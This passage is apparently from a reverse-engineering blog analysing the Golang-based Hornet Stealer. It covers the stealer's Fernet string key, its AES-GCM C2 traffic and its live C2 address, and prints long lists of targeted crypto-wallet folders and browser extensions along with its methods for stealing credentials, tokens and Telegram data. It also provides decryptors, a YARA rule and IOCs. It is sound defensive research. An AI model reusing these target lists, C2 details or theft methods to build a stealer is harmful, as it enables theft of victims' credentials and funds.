applications, such as browsers, wallets, Steam, Telegram, among others. The malware decrypts strings using Fernet with a hardcoded key, then encrypts the acquired data using AES GCM, and finally transmits this encrypted data to a server via TCP connection.In this article, we aim to discover and analyze the earliest known sample of the Hornet Stealer malware.Part 2 - Dissecting the First Hornet Stealer Sample1. Tracing the Origins of the Hornet StealerTo locate the initial sample of the Hornet Stealer, we can examine the IP address relationships mentioned in @spamhaus’s tweet on VirusTotal.Upon searching for the IP address 185.221.198.118 and navigating to the Relations tab on VirusTotal, one can observe a file under the ‘Communicating Files’ section. This file appears to be malicious, indicated by its high detection score of 42 out of 71.Navigating to the Details tab of this file reveals that it is programmed in Golang, and its initial submission date of January 23, 2024, suggests that it’s a recent addition. These details strongly point to it being the Hornet Stealer sample we’re investigating.SHA256: bc3ee10c21cb07bc0dd6b84a6eaf8efbd0af889467ab7ef647acf60f8c188e83Prior to analyzing this file, it’s worthwhile to investigate its potential connection with Smokeloader. However, the Relations tab in VirusTotal doesn’t display any links to Smokeloader. A quick Google search using the file’s hash led to a result from Unpacme, revealing that this file is hosted on the transfer.sh website with a name setup.exe.Link: https://transfer.sh/get/q4ccSmjmTB/setup.exeA search on VirusTotal using this link reveals a Crowdsourced Context note stating Activity related to SMOKELOADER. However, it doesn’t provide an associated sample.2. Deep Dive into the Hornet Stealer’s First SampleSHA256: bc3ee10c21cb07bc0dd6b84a6eaf8efbd0af889467ab7ef647acf60f8c188e83Aware that this sample contains encrypted strings and utilizes Fernet for runtime decryption, we can proceed by loading the sample into IDA. This will allow us to closely examine its string decryption routine.Given that the sample’s symbolic information is not stripped, IDA has been able to rename all functions, thereby facilitating an easier analysis.The presence of meaningful function names simplifies our task to reading the code. Nonetheless, the challenge lies in the encryption of crucial strings. To uncover how they are decrypted, we concentrate on the first function call, following the path: main.main &amp;gt; setup_utils_AntiCIS &amp;gt; setup_utils_GetkeyboardLayoutList &amp;gt; setup_utils_DecryptString. This path leads us to identify setup_utils_DecryptString as the key function for string decryption.The recurring use of a string at the offset off_70CC10 before every call to setup_utils_DecryptString suggested to us that this might be the decryption key.Although @spamhaus’s tweet already indicated the use of Fernet, we can confirm this by examining setup_utils_DecryptString more closely.With the algorithm, decryption key, and encrypted data at hand, we have the opportunity to use Python for decrypting a string, which will validate the correctness of our approach.&amp;gt;&amp;gt;&amp;gt; from cryptography.fernet import Fernet&amp;gt;&amp;gt;&amp;gt; key = &#39;MpQzH0ne3b-TkBgkJ0tbdALxiCiJuLBleGUlEoIGQoo=&#39;&amp;gt;&amp;gt;&amp;gt; encrypted_data = &#39;gAAAAABlsBIs-I3FZyAavfZo8FAeeSmwVqn5DHwjQGrATv5Mz3jzjEk9KD9LBJiTzKDvGmb-RFX1Z-jBO4x5JUIy-ZD6Zf103A==&#39;&amp;gt;&amp;gt;&amp;gt; fernet = Fernet(key)&amp;gt;&amp;gt;&amp;gt; decrypted_data = fernet.decrypt(encrypted_data)&amp;gt;&amp;gt;&amp;gt; decrypted_data**b&#39;user32.dll&#39;**&amp;gt;&amp;gt;&amp;gt; decrypted_data.decode()**&#39;user32.dll&#39;**The effectiveness of our method was proven when our Python code decrypted a string into user32.dll. Henceforth, I will decrypt and annotate every string in the functions with their decrypted counterparts as comments. Furthermore, at the end of this article, a custom string extractor for this malware sample will be introduced.Armed with this knowledge, let’s delve into analyzing some key functionalities of the Hornet Stealer, starting with the setup_utils_init function.setup_utils_init FunctionWe begin our analysis with the setup_utils_init function, which is executed even before the main function. It plays a crucial role in decrypting several important strings, one of which is the C2 address.setup_Grabber_init FunctionThe setup_Grabber_init function, executing prior to the main function, decrypts several crucial strings, including a list of wallet applications. The utilization of these decrypted strings will be explored in a later part of our analysis.First decrypted string;Exodus || exodus || Partitions || cache || dictionarAtomic || atomic || cache || IndexedDBJaxxLiberty || com.liberty.jaxx || cacheCoinomi || Coinomi\\Coinomi\\wallets || null-Electrum || Electrum\\wallets || null-Electrum-LTC || Electrum-LTC\\wallets || null-ElectronCash || ElectronCash\\wallets || null-Guarda || Guarda || cache || IndexedDBMyMonero || MyMonero || cacheMonero || Monero\\\\wallets || null-Wasabi || WalletWasabi\\\\Client || tor || logTokenPocket || TokenPocket || cacheLedger Live || Ledger Live || cache || dictionar || sqliteBinance || Binance || cache || null-Second decrypted string;fhbohimaelbohpjbbldcngcnapndodjp || BinanceChainfnjhmkhhmkbjkkabndcnnogagogbneec || Roninkjmoohlgokccodicjjfebfomlbljgfhk || Roninnkbihfbeogaeaoehlefnkodbefgpgknn || MetaMaskejbalbakoplchlghecdalmeeeajnimhm || MetaMaskibnejdfjmmkpcnlpebklmnkoeoihofec || TronLinkegjidjbpglichdcondbcbdnbeeppgdph || TrustWalletbfnaelmomeimhlpmgjnjophhpkkoljpa || Phantomhnfanknocfeofbddgcijnmhnfnkdnaad || Coinbaseodbfpeeihdkbihmopkbjmoonfanlbfcl || Bravecgeeodpfagjceefieflmdfphplkenlfk || TONaeachknmefphepccionboohckonoeemg || Coin98mcohilncbfahbmgdjkbpemcciiolgcge || MetaXhmeobnfnfcmdkdcmlblgagmfpfboieaf || XDEFIlpilbniiabackdjcionkobglmddfbcjo || WavesKeeperbhhhlbepdkbapadjdnnojkbgioiodbic || Solflareacmacodkjbdgmoleebolmdjonilkdbch || Rabbydkdedlpgdmmkkfjabffeganieamfklkm || CyanoWalletcnmamaachppnkjgnildpdmkaakejnhae || AuroWallethcflpincpppdclinealmandijcmnkbgn || KHCmnfifefkajgofkcjkemidiaecocnkjeh || TezBoxookjlbkiijinhpmnjffcofjonbfbgaoc || Templeflpiciilemghbmfalicajoolhkkenfel || ICONexfhmfendgdocmcbmfikdcogofphimnkno || Solletnhnkbkgjikgcigadomkphalanndcapjk || CloverWalletjojhfeoedkpkglbfimdfabpdfjaoolaf || PolymeshWalletcphhlgmgameodnhkjdmkpanlelnlohao || NeoLinedmkamcknogkgcdfhhbddcghachkejeap || Keplrajkhoeiiokighlmdnlakpjfoobnjinie || TerraStationaiifbnbfobpmeekipheeijimdpnlpgpp || TerraStationkpfopkelmapcoipemfendmdcghnegimn || Liqualitynkddgncdjgjfcddamfgcmfnlhccnimig || SaturnWalletnanjmdknhkinifnkgdcggcfnhdaammmj || GuildWalletjnkelfanjkeadonecabehalmbgpfodjm || Gobynphplpgoakhhjchkkhmiggakijnkhfnd || TONfpkhgmpbidmiogeglndfbkegfdlnajnf || Cosmostationjiidiaalihmmhddjgbnbgdfflelocpak || BitKeeppgiaagfkgcbnmiiolekcfmljdagdhlcm || Stargazercjelfplplebdjjenllpjcblmjkfcffne || JaxxLibertykkpllkodjeloidieedojogacfhpaihoh || Enkryptpkkjjapmlcncipeecdmlhaipahfdphkd || GameStopWalletaholpfdialjgjfhomihkjbmgjidlcdno || ExodusWeb3Walletnngceckbapebfimnlniiiahkandclblb || Bitwardenefbglgofoippbgcjepnhiblaibcnclgk || MartianAptosjnlgamecbpmbajjfhmmmlhejkemejdma || Braavosmcohilncbfahbmgdjkbpemcciiolgcge || OKXphkbamefinggmakgklpkljjmgibohnba || PontemAptosepapihdplajcdnnkdeiahlgigofloibg || SenderWalletgjagmgiddbbciopjhllkdnddhcglnemk || Hashpackcgeeodpfagjceefieflmdfphplkenlfk || EVERcjmkndjhnagcfbpiemnkdpomccnjblmj || Finnieaijcbedoijmgnlmjeegjaglmepbmpkpi || LeapTerraejjladinnckdgjemekebdpeokbikhfci || PetraAptoskmhcihpebfmpgmihbkipmjlmmioameka || Eternlbgpipimickeadkjlklgciifhnalhdjhe || GeroWalletlpfcbjknijpeeillifnkikgncikgfhdo || NamiWalletpocmplpaccanhmnllbbkpgfliimjljgo || SlopeWalletffnbelfdoeiohenkjibnmadjiehjhajb || Yoroiafbcbjpbpfadlkmhmclhkeeodmamcflc || Mathhpglfhgfnhbgpjdenjgmdgoeiappafln || Guardakncchdigobghenbbaddojjnnaogfppfj || iWalletamkmjjmmflddogmhpjloimipbofnfjih || Wombatnlbmnnijcnlegkjjpcfjclmcfggfefdm || MEWCXnknhiehlklippafakaeklbeglecifhad || NaboxWalletjnmbobjmhlngoefaiojfljckilhhlhcj || OneKeypdadjkfkgcafgbceimcpbkalnfnepbnk || KardiaChainWalletsetup_utils_AntiCIS FunctionIn the main function screenshot, we see that the first call made by the malware is to setup_utils_AntiCIS. This function begins by decrypting and utilizing user32.dll and GetKeyboardLayoutList. It then invokes GetKeyboardLayoutList and compares the obtained keyboard layouts with a preset list. From its name and behavior, it’s clear that this function is designed to check for keyboard layouts typical of the CIS region countries, and if a match is detected, the malware promptly exits without executing further.Interestingly, one of the hex values, 443h, does not have a corresponding keyboard identifier in Microsoft’s official documentation on Windows keyboard layouts.The AntiCIS function uniquely targets devices based on their geographic location, specifically halting execution on those with CIS region keyboard layouts. This is a common tactic in malware, typically to avoid affecting systems in the developers’ own region, possibly due to legal or ethical considerations.setup_utils_Connection FunctionThe setup_utils_Connection function straightforwardly initiates a TCP connection between the C2 server (185.221.198.118:8080) and the infected device. Should it fail to establish this connection to the C2 address, the function will terminate the process.Once this connection is successfully established, the malware initiates its data collection process.main_launchUserInfo FunctionThe main_launchUserInfo function initially creates a folder named \\logs\\MainFolderLog, then proceeds to gather various system details like CPU, GPU, RAM, OS, TimeZone, Language, and Architecture, storing this information in \\logs\\MainFolderLog\\UserInformation.txt. It also compiles a list of installed applications, saving it in \\logs\\MainFolderLog\\InstalledSoftware.txt’ Finally, it encrypts this data with AES GCM and transmits it to the C2 server. The specifics of C2 traffic encryption will be addressed later in our analysis.Data format;Tags: %sBuildId: %sUserName: %sCPU: %sGPU: %sRAM: %sOS: %sCurrent date: %sTimeZone: %sLanguage: %sArchitecture: %sScreen: %sHWID: %smain_launchDesktopwallet FunctionThe main_launchDesktopwallet function scans for the decrypted wallet folder names within the \\AppData\\Roaming directory. Upon finding a match, it encrypts the relevant data and transmits it to the C2 server.Wallet list;Exodus || exodus || Partitions || cache || dictionarAtomic || atomic || cache || IndexedDBJaxxLiberty || com.liberty.jaxx || cacheCoinomi || Coinomi\\Coinomi\\wallets || null-Electrum || Electrum\\wallets || null-Electrum-LTC || Electrum-LTC\\wallets || null-ElectronCash || ElectronCash\\wallets || null-Guarda || Guarda || cache || IndexedDBMyMonero || MyMonero || cacheMonero || Monero\\\\wallets || null-Wasabi || WalletWasabi\\\\Client || tor || logTokenPocket || TokenPocket || cacheLedger Live || Ledger Live || cache || dictionar || sqliteBinance || Binance || cache || null-main_launchwallet FunctionFunctioning in a recursive manner, main_launchwallet explores both the \\AppData\\Roaming and \\AppData\\Local directories, targeting the previously decrypted names of wallet browser extensions located in the various browsers’ Extensions folders.Wallet Extension List;fhbohimaelbohpjbbldcngcnapndodjp || BinanceChainfnjhmkhhmkbjkkabndcnnogagogbneec || Roninkjmoohlgokccodicjjfebfomlbljgfhk || Roninnkbihfbeogaeaoehlefnkodbefgpgknn || MetaMaskejbalbakoplchlghecdalmeeeajnimhm || MetaMaskibnejdfjmmkpcnlpebklmnkoeoihofec || TronLinkegjidjbpglichdcondbcbdnbeeppgdph || TrustWalletbfnaelmomeimhlpmgjnjophhpkkoljpa || Phantomhnfanknocfeofbddgcijnmhnfnkdnaad || Coinbaseodbfpeeihdkbihmopkbjmoonfanlbfcl || Bravecgeeodpfagjceefieflmdfphplkenlfk || TONaeachknmefphepccionboohckonoeemg || Coin98mcohilncbfahbmgdjkbpemcciiolgcge || MetaXhmeobnfnfcmdkdcmlblgagmfpfboieaf || XDEFIlpilbniiabackdjcionkobglmddfbcjo || WavesKeeperbhhhlbepdkbapadjdnnojkbgioiodbic || Solflareacmacodkjbdgmoleebolmdjonilkdbch || Rabbydkdedlpgdmmkkfjabffeganieamfklkm || CyanoWalletcnmamaachppnkjgnildpdmkaakejnhae || AuroWallethcflpincpppdclinealmandijcmnkbgn || KHCmnfifefkajgofkcjkemidiaecocnkjeh || TezBoxookjlbkiijinhpmnjffcofjonbfbgaoc || Templeflpiciilemghbmfalicajoolhkkenfel || ICONexfhmfendgdocmcbmfikdcogofphimnkno || Solletnhnkbkgjikgcigadomkphalanndcapjk || CloverWalletjojhfeoedkpkglbfimdfabpdfjaoolaf || PolymeshWalletcphhlgmgameodnhkjdmkpanlelnlohao || NeoLinedmkamcknogkgcdfhhbddcghachkejeap || Keplrajkhoeiiokighlmdnlakpjfoobnjinie || TerraStationaiifbnbfobpmeekipheeijimdpnlpgpp || TerraStationkpfopkelmapcoipemfendmdcghnegimn || Liqualitynkddgncdjgjfcddamfgcmfnlhccnimig || SaturnWalletnanjmdknhkinifnkgdcggcfnhdaammmj || GuildWalletjnkelfanjkeadonecabehalmbgpfodjm || Gobynphplpgoakhhjchkkhmiggakijnkhfnd || TONfpkhgmpbidmiogeglndfbkegfdlnajnf || Cosmostationjiidiaalihmmhddjgbnbgdfflelocpak || BitKeeppgiaagfkgcbnmiiolekcfmljdagdhlcm || Stargazercjelfplplebdjjenllpjcblmjkfcffne || JaxxLibertykkpllkodjeloidieedojogacfhpaihoh || Enkryptpkkjjapmlcncipeecdmlhaipahfdphkd || GameStopWalletaholpfdialjgjfhomihkjbmgjidlcdno || ExodusWeb3Walletnngceckbapebfimnlniiiahkandclblb || Bitwardenefbglgofoippbgcjepnhiblaibcnclgk || MartianAptosjnlgamecbpmbajjfhmmmlhejkemejdma || Braavosmcohilncbfahbmgdjkbpemcciiolgcge || OKXphkbamefinggmakgklpkljjmgibohnba || PontemAptosepapihdplajcdnnkdeiahlgigofloibg || SenderWalletgjagmgiddbbciopjhllkdnddhcglnemk || Hashpackcgeeodpfagjceefieflmdfphplkenlfk || EVERcjmkndjhnagcfbpiemnkdpomccnjblmj || Finnieaijcbedoijmgnlmjeegjaglmepbmpkpi || LeapTerraejjladinnckdgjemekebdpeokbikhfci || PetraAptoskmhcihpebfmpgmihbkipmjlmmioameka || Eternlbgpipimickeadkjlklgciifhnalhdjhe || GeroWalletlpfcbjknijpeeillifnkikgncikgfhdo || NamiWalletpocmplpaccanhmnllbbkpgfliimjljgo || SlopeWalletffnbelfdoeiohenkjibnmadjiehjhajb || Yoroiafbcbjpbpfadlkmhmclhkeeodmamcflc || Mathhpglfhgfnhbgpjdenjgmdgoeiappafln || Guardakncchdigobghenbbaddojjnnaogfppfj || iWalletamkmjjmmflddogmhpjloimipbofnfjih || Wombatnlbmnnijcnlegkjjpcfjclmcfggfefdm || MEWCXnknhiehlklippafakaeklbeglecifhad || NaboxWalletjnmbobjmhlngoefaiojfljckilhhlhcj || OneKeypdadjkfkgcafgbceimcpbkalnfnepbnk || KardiaChainWalletmain_launchBrowser FunctionServing as a typical stealer function, main_launchBrowser is dedicated to harvesting browser data, including login details and cookies. After gathering this data, the function encrypts it and then sends it off to the C2.main_launchTelegram FunctionThe main_launchTelegram function targets the \\AppData\\Roaming\\Telegram Desktop\\tdata directory, extracting critical files such as key_data and usertag. Following the theft, it encrypts this data and dispatches it to the C2 server.main_launchSteam FunctionThe main_launchSteam function is designed to gather data from the Steam desktop application, including auto-login information, game lists, and statuses. This stolen data is compiled into SteamInfo.txt, encrypted, and then transmitted to the C2 server.main_launchScreenshot FunctionAs its name suggests, the main_launchScreenshot function captures screenshots of the current windows, saving them with the naming format ScreenShot (%d_%dx%d).png. After saving, it encrypts these screenshots and transmits them to the C2 server.main_launchDiscord FunctionThe main_launchDiscord function searches through the \\AppData\\Local and \\AppData\\Roaming directories to locate leveldb files associated with the Discord Desktop app. After collecting this data, it compiles it into ‘Tokens.txt’, encrypts the file, and sends it to the C2 server.setup_utils_Send FunctionThe setup_utils_Send function initially stores the stolen data files in the \\logs folder. It then decrypts a string for use in the traffic encryption routine, generates a nonce for AES GCM encryption, and calculates the MD5 of previously decrypted string to serve as the AES GCM encryption key. Finally, it encrypts the data and transmits it to the C2 server.Decrypted string;Calculating MD5 and starts AES GCM;The encrypted traffic can be decrypted using Python, as demonstrated by the following code snippet.from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modesfrom cryptography.hazmat.backends import default_backendfrom binascii import unhexlifydef decrypt(cipher_hex, key): cipher_bytes = unhexlify(cipher_hex) nonce_size = 12 tag_size = 16 nonce = cipher_bytes[:nonce_size] tag = cipher_bytes[-tag_size:] cipher_text = cipher_bytes[nonce_size:-tag_size] decryptor = Cipher( algorithms.AES(key), modes.GCM(nonce, tag), backend=default_backend() ).decryptor() return decryptor.update(cipher_text) + decryptor.finalize()key = b&#39;7b1da832deb12b2dd4065c7c43aec101&#39;encrypted_hex = &#39;&#39;decrypted_text = decrypt(encrypted_hex, key)print(&quot;Decrypted text:&quot;, decrypted_text)To maintain the confidentiality of my VM’s specifics, I’ve truncated and randomized the decrypted data, but the representation below illustrates how it appears.Decrypted text: b&#39;G\\xff\\x81\\x03\\x01\\x01\\x07FileObj\\x01\\xff\\x82\\x00\\x01\\x04\\x01\\x08FileName\\x01\\x0c\\x00\\x01\\x08IsFolder\\x01\\x02\\x00\\x01\\x08FileByte\\x01\\n\\x00\\x01\\x05Files\\x01\\xff\\x84\\x00\\x00\\x00\\x1e\\xff\\x83\\x02\\x01\\x01\\x0f[]utils.FileObj\\x01\\xff\\x84\\x00\\x01\\xff\\x82\\x00\\x00\\xfe\\x07\\xdc\\xff\\x82\\x01\\rMainFolderLog\\x01\\x01\\x02\\x02\\x01\\x13UserInformation.txt\\x02\\xfe\\x01NTags: Installs\\nBuildId: Installs\\nUserName: WIN10\\\\admin\\nCPU: 14th Gen Intel(R) Core(TM) i15-15200 (1 cores)\\nGPU: VMware SVGA 3D\\nRAM: 8190 MB\\nOS: Microsoft Windows 10 Enterprise\\nCurrent date: 2099.08.29 00:05:04\\nTimeZone: UTC +2 Hours\\nLanguage: en-US\\nArchitecture: x64-based PC\\nScreen: 3238 x 1274\\nHWID: 3782542AB18F411BC42897C0D3D0FB3E\\n\\n\\x00\\x01\\x15InstalledSoftware.txt\\x02\\xfe\\x06B%!(EXTRA string=\\t7-Zip 18.01 (x64)\\n\\tExplorer Suite IV\\n\\tHxD Hex Editor 2.5\\n\\tIDA Freeware 8.3\\n\\t\\n)\\x00\\x00&#39;The presence of non-ASCII characters in the decrypted data suggests the possibility of serialized object usage.Part 3 - C2 PanelWhile all traffic between the malware and the C2 server is encrypted and sent via TCP to the server’s port 8080, @spamhaus’s tweet also indicates the existence of an HTTP web application used for the C2 panel.As of the time of writing this article, the C2 server shared by @spamhaus is currently inaccessible.Guided by @spamhaus’s tweet, which identifies the malware as Hornet Stealer based on the panel logo and name, we can conduct targeted Censys searches using queries like;services.http.response.body:&quot;Welcome back!&quot; AND services.http.response.body:&quot;Happy to see you again!&quot; AND services.http.response.body:&quot;Username&quot; AND services.http.response.body:&quot;Password&quot; AND services.port:8080services.http.response.body:&quot;Hornet Stealer&quot;services.http.response.body:&quot;Hornet&quot; AND services.http.response.body:&quot;Stealer&quot;However, none of these queries succeeded in finding a new C2 address.Part 4 - Yara Rule and String ExtractorYara RuleIn the Yara Rule section of our article, considering the encryption of most strings, we will concentrate on certain key aspects and plaintext strings for crafting our Yara rule. This includes focusing on encryption methods utilized by the malware, such as Fernet and AES-GCM, as well as unique user code function names.rule HornetStealer_Golang { meta: author = &quot;tufan - @tufan_gngr&quot; description = &quot;Detects Hornet stealer non-stripped samples&quot; date = &quot;2024-01-30&quot; references = &quot;https://tufan-gungor.github.io/&quot; references = &quot;https://twitter.com/spamhaus/status/1750170178493526350&quot; hash = &quot;bc3ee10c21cb07bc0dd6b84a6eaf8efbd0af889467ab7ef647acf60f8c188e83&quot; strings: $s1 = &quot;main&quot; $s2 = &quot;setup/utils&quot; $s3 = &quot;crypto/cipher.NewGCM&quot; $s4 = &quot;fernet&quot; $a1 = &quot;launchBrowser&quot; $a2 = &quot;launchDesktopWallet&quot; $a3 = &quot;launchDiscord&quot; $a4 = &quot;launchSteam&quot; $a5 = &quot;launchTelegram&quot; $a6 = &quot;launchWallet&quot; $a7 = &quot;launchUserInfo&quot; condition: uint16(0) == 0x5a4d and (5 of ($a*)) or (#s1 &amp;gt; 10 and #s2 &amp;gt; 20 and $s3 and $s4)}The Yara searches conducted on Unpacme and VirusTotal did not yield any new samples, only returning the one we already possess.In addition to our Yara rule, other string searches, as listed below, also failed to yield any results.C:/Users/admin/Desktop/GOAdminmain.launchDesktopwalletsetup/utils.SendString Extractor / DecryptorIn the String Extractor/Decryptor segment, we now focus on developing a Python decryptor for the malware’s encrypted strings, given that we have the necessary tools at hand. A notable difficulty, however, lies in the Golang structure, where the lack of null bytes between strings complicates their extraction without causing breaks.Consequently, we will employ Mandiant’s tool known as FLOSS (FLARE Obfuscated String Solver) for extracting strings from the Golang binary. As of December 12, 2023, FLOSS has included support for Golang string extraction.Our first step is to execute FLOSS on the Hornet Stealer, and then we will capture and store the resulting output in an output.txt file.”.\\floss.exe .\\hornet.exe &amp;gt; output.txtSubsequently, our string decryptor will process each line from the output.txt file, decrypting them with the Fernet key. Successful decryptions will result in the decrypted text being printed.Here is our Python code;from cryptography.fernet import Fernetdef decrypt_line(line, key): fernet = Fernet(key) try: decrypted_data = fernet.decrypt(line.encode()) return decrypted_data.decode() except Exception as e: return Nonedef decrypt_file(filename, key): with open(filename, &#39;r&#39;, errors=&#39;ignore&#39;) as file: for line in file: line = line.strip() if line and len(line) &amp;gt; 10: decrypted_data = decrypt_line(line, key) if decrypted_data: print(&quot;Decrypted Data:&quot;, decrypted_data)if __name__ == &quot;__main__&quot;: filename = &#39;output.txt&#39; key = &#39;MpQzH0ne3b-TkBgkJ0tbdALxiCiJuLBleGUlEoIGQoo=&#39; decrypt_file(filename, key)Output:Decrypted Data: Tags: %sBuildId: %sUserName: %sCPU: %sGPU: %sRAM: %sOS: %sCurrent date: %sTimeZone: %sLanguage: %sArchitecture: %sScreen: %sHWID: %sDecrypted Data: user32.dllDecrypted Data: usertagDecrypted Data: FalseDecrypted Data: Tokens.txtDecrypted Data: LocalFreeDecrypted Data: Kernel32.dllDecrypted Data: LanguageDecrypted Data: SteamInfo.txtDecrypted Data: leveldbDecrypted Data: WalletDecrypted Data: Login DataDecrypted Data: MainFolderLogDecrypted Data: key_dataDecrypted Data: .ldbDecrypted Data: DisplayNameDecrypted Data: Web DataDecrypted Data: vdfDecrypted Data: FalseDecrypted Data: cookies.sqliteDecrypted Data: TelegramDecrypted Data: InstallsDecrypted Data: Desktop WalletsDecrypted Data: RunningDecrypted Data: InstallsDecrypted Data: logins.jsonDecrypted Data: ssfnDecrypted Data: InstalledDecrypted Data: .logDecrypted Data: Local StateDecrypted Data: UpdatingDecrypted Data: SteamPathDecrypted Data: AutoLoginUserDecrypted Data: tdataDecrypted Data: FalseDecrypted Data: Crypt32.dllDecrypted Data: settingsDecrypted Data: ExtensionsDecrypted Data: UserInformation.txtDecrypted Data: GetKeyboardLayoutListDecrypted Data: InstalledSoftware.txtDecrypted Data: CryptUnprotectDataDecrypted Data: Software\\\\Valve\\\\SteamDecrypted Data: discord\\\\Local Storage\\\\leveldbDecrypted Data: os_crypt.encrypted_keyDecrypted Data: Software\\\\Valve\\\\Steam\\\\Apps\\\\Decrypted Data: AutoLogin: %s\\nLanguage: %s\\n\\nDecrypted Data: 185.221.198.118:8080Decrypted Data: Software\\\\Valve\\\\Steam\\\\AppsDecrypted Data: JAGSDiusuidsgdisbdhb32te72hqbsilydfg1Decrypted Data: discordptb\\\\Local Storage\\\\leveldbDecrypted Data: discordcanary\\\\Local Storage\\\\leveldbDecrypted Data: [\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}Decrypted Data: 5hKEw9TAVDZPA6CblkDK86Dhd9HF1E5BDecrypted Data: SELECT ExecutablePath FROM Win32_Process WHERE Name =Decrypted Data: SELECT Caption, MUILanguages FROM win32_operatingsystemDecrypted Data: SELECT Name, NumberOfCores, ProcessorId FROM Win32_ProcessorDecrypted Data: SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\UninstallDecrypted Data: SELECT VolumeSerialNumber FROM Win32_LogicalDisk WHERE DeviceID =Decrypted Data: Select Model, SystemType, TotalPhysicalMemory, CurrentTimeZone From Win32_ComputerSystemDecrypted Data: SELECT Name, CurrentHorizontalResolution, CurrentVerticalResolution FROM Win32_VideoControllerDecrypted Data: Application %s\\n\\tGameID: %s\\n\\tInstalled: %s\\n\\tRunning: %s\\n\\tUpdating: %s\\n\\nDecrypted Data: Telegram DesktopDecrypted Data: Tags: %sBuildId: %sUserName: %sCPU: %sGPU: %sRAM: %sOS: %sCurrent date: %sTimeZone: %sLanguage: %sArchitecture: %sScreen: %sHWID: %sDecrypted Data: Exodus || exodus || Partitions || cache || dictionarAtomic || atomic || cache || IndexedDBJaxxLiberty || com.liberty.jaxx || cacheCoinomi || Coinomi\\Coinomi\\wallets || null-Electrum || Electrum\\wallets || null-Electrum-LTC || Electrum-LTC\\wallets || null-ElectronCash || ElectronCash\\wallets || null-Guarda || Guarda || cache || IndexedDBMyMonero || MyMonero || cacheMonero || Monero\\\\wallets || null-Wasabi || WalletWasabi\\\\Client || tor || logTokenPocket || TokenPocket || cacheLedger Live || Ledger Live || cache || dictionar || sqliteBinance || Binance || cache || null-Decrypted Data: fhbohimaelbohpjbbldcngcnapndodjp || BinanceChainfnjhmkhhmkbjkkabndcnnogagogbneec || Roninkjmoohlgokccodicjjfebfomlbljgfhk || Roninnkbihfbeogaeaoehlefnkodbefgpgknn || MetaMaskejbalbakoplchlghecdalmeeeajnimhm || MetaMaskibnejdfjmmkpcnlpebklmnkoeoihofec || TronLinkegjidjbpglichdcondbcbdnbeeppgdph || TrustWalletbfnaelmomeimhlpmgjnjophhpkkoljpa || Phantomhnfanknocfeofbddgcijnmhnfnkdnaad || Coinbaseodbfpeeihdkbihmopkbjmoonfanlbfcl || Bravecgeeodpfagjceefieflmdfphplkenlfk || TONaeachknmefphepccionboohckonoeemg || Coin98mcohilncbfahbmgdjkbpemcciiolgcge || MetaXhmeobnfnfcmdkdcmlblgagmfpfboieaf || XDEFIlpilbniiabackdjcionkobglmddfbcjo || WavesKeeperbhhhlbepdkbapadjdnnojkbgioiodbic || Solflareacmacodkjbdgmoleebolmdjonilkdbch || Rabbydkdedlpgdmmkkfjabffeganieamfklkm || CyanoWalletcnmamaachppnkjgnildpdmkaakejnhae || AuroWallethcflpincpppdclinealmandijcmnkbgn || KHCmnfifefkajgofkcjkemidiaecocnkjeh || TezBoxookjlbkiijinhpmnjffcofjonbfbgaoc || Templeflpiciilemghbmfalicajoolhkkenfel || ICONexfhmfendgdocmcbmfikdcogofphimnkno || Solletnhnkbkgjikgcigadomkphalanndcapjk || CloverWalletjojhfeoedkpkglbfimdfabpdfjaoolaf || PolymeshWalletcphhlgmgameodnhkjdmkpanlelnlohao || NeoLinedmkamcknogkgcdfhhbddcghachkejeap || Keplrajkhoeiiokighlmdnlakpjfoobnjinie || TerraStationaiifbnbfobpmeekipheeijimdpnlpgpp || TerraStationkpfopkelmapcoipemfendmdcghnegimn || Liqualitynkddgncdjgjfcddamfgcmfnlhccnimig || SaturnWalletnanjmdknhkinifnkgdcggcfnhdaammmj || GuildWalletjnkelfanjkeadonecabehalmbgpfodjm || Gobynphplpgoakhhjchkkhmiggakijnkhfnd || TONfpkhgmpbidmiogeglndfbkegfdlnajnf || Cosmostationjiidiaalihmmhddjgbnbgdfflelocpak || BitKeeppgiaagfkgcbnmiiolekcfmljdagdhlcm || Stargazercjelfplplebdjjenllpjcblmjkfcffne || JaxxLibertykkpllkodjeloidieedojogacfhpaihoh || Enkryptpkkjjapmlcncipeecdmlhaipahfdphkd || GameStopWalletaholpfdialjgjfhomihkjbmgjidlcdno || ExodusWeb3Walletnngceckbapebfimnlniiiahkandclblb || Bitwardenefbglgofoippbgcjepnhiblaibcnclgk || MartianAptosjnlgamecbpmbajjfhmmmlhejkemejdma || Braavosmcohilncbfahbmgdjkbpemcciiolgcge || OKXphkbamefinggmakgklpkljjmgibohnba || PontemAptosepapihdplajcdnnkdeiahlgigofloibg || SenderWalletgjagmgiddbbciopjhllkdnddhcglnemk || Hashpackcgeeodpfagjceefieflmdfphplkenlfk || EVERcjmkndjhnagcfbpiemnkdpomccnjblmj || Finnieaijcbedoijmgnlmjeegjaglmepbmpkpi || LeapTerraejjladinnckdgjemekebdpeokbikhfci || PetraAptoskmhcihpebfmpgmihbkipmjlmmioameka || Eternlbgpipimickeadkjlklgciifhnalhdjhe || GeroWalletlpfcbjknijpeeillifnkikgncikgfhdo || NamiWalletpocmplpaccanhmnllbbkpgfliimjljgo || SlopeWalletffnbelfdoeiohenkjibnmadjiehjhajb || Yoroiafbcbjpbpfadlkmhmclhkeeodmamcflc || Mathhpglfhgfnhbgpjdenjgmdgoeiappafln || Guardakncchdigobghenbbaddojjnnaogfppfj || iWalletamkmjjmmflddogmhpjloimipbofnfjih || Wombatnlbmnnijcnlegkjjpcfjclmcfggfefdm || MEWCXnknhiehlklippafakaeklbeglecifhad || NaboxWalletjnmbobjmhlngoefaiojfljckilhhlhcj || OneKeypdadjkfkgcafgbceimcpbkalnfnepbnk || KardiaChainWalletPart 5 - IOCsbc3ee10c21cb07bc0dd6b84a6eaf8efbd0af889467ab7ef647acf60f8c188e83185.221.198.118:8080References https://twitter.com/spamhaus/status/1750170178493526350 https://github.com/mandiant/flare-flossI utilized AI assistance to fine-tune certain sentences in this post, enhancing clarity and precision." }, { "title": "Hunt and Analysis - Sentinel Stealer", "url": "/posts/sentinel-stealer-analysis/", "categories": "Reverse Engineering, Malware Hunting", "tags": "reverse engineering, malware hunting", "date": "2024-01-20 19:00:00 +0300", "snippet": "Part 1 - Sentinel Stealer || Stealer as a ServiceOn January 19th, the Twitter account @FalconFeedsio reported the discovery of a new stealer, known as Sentinel Stealer. Although there were earlier mentions on YouTube and the stealer’s website, our examination begins with the information provided by 